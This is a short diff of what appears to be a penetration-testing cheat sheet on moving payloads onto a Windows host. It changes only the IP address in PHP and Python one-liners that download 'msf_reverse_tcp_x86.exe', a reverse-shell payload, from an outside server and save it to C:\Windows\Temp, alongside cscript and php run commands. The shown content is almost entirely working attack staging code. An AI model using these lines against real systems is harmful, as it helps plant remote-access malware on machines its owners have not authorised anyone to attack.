@@ -108,7 +108,7 @@ C:\Users\Administrator\Desktop> cscript test.vbs
 ```
 #!/usr/bin/php
 <?php
-    $data = file_get_contents("http://114.115.183.86/wyb/msf_reverse_tcp_x86.exe");
+    $data = file_get_contents("http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe");
     file_put_contents('C:\\Windows\\Temp\\aa.exe',$data);
 ?>
 ```
@@ -117,7 +117,7 @@ C:\Users\Administrator\Desktop> php aa.php
 * Python
 
 ```
-import urllib2;u = urllib2.urlopen('http://114.115.183.86/wyb/msf_reverse_tcp_x86.exe');f = open('C:\\Windows\\Temp\\aa.exe', 'w');f.write(u.read());f.close();
+import urllib2;u = urllib2.urlopen('http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe');f = open('C:\\Windows\\Temp\\aa.exe', 'w');f.write(u.read());f.close();
 ```
 C:\Users\Administrator\Desktop> python aa.py
 
